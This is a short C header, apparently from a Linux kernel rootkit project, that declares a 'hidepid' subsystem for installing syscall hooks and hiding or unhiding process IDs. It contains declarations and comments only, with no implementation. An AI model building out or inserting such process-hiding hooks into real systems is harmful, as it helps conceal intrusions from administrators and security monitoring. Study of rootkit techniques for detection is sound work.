#ifndef __YARR_HIDEPID
#define __YARR_HIDEPID

#include <linux/types.h>

/**
 * Initializes the hidepid subsystem.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hidepid_init(void);

/**
 * Termintes the use of hidepid subsystem.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hidepid_finish(void);

/**
 * The hidepid subsystem implement a few syscall hooks. This function install
 * them.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hidepid_install_hooks(void);

/**
 * Hides a pid in the system.
 *
 * @pid: The pid to hide.
 * @return: Zero on success, non-zero elsewhere.
 */
int hide_pid(pid_t pid);

// TODO: When a process dies (sys_exit system call I think) we should remove it
// from the list of hidden pids. For now the user must explicitly call
// unhide_pid, otherwise the number will remain in the list and processes
// spawned later may re-use the same pid and therefore they will remain hidden.
/**
 * Stops hiding a pid.
 *
 * @pid: The pid to stop hiding, if the pid wasn't already hidden returns an
 * error.
 * @return: Zero on success, non-zero elsewhere.
 */
int unhide_pid(pid_t pid);

/**
 * Stops hidding all previous hidden pids.
 */
void unhide_pid_all(void);

void show_tasks_stacks(void);

#endif
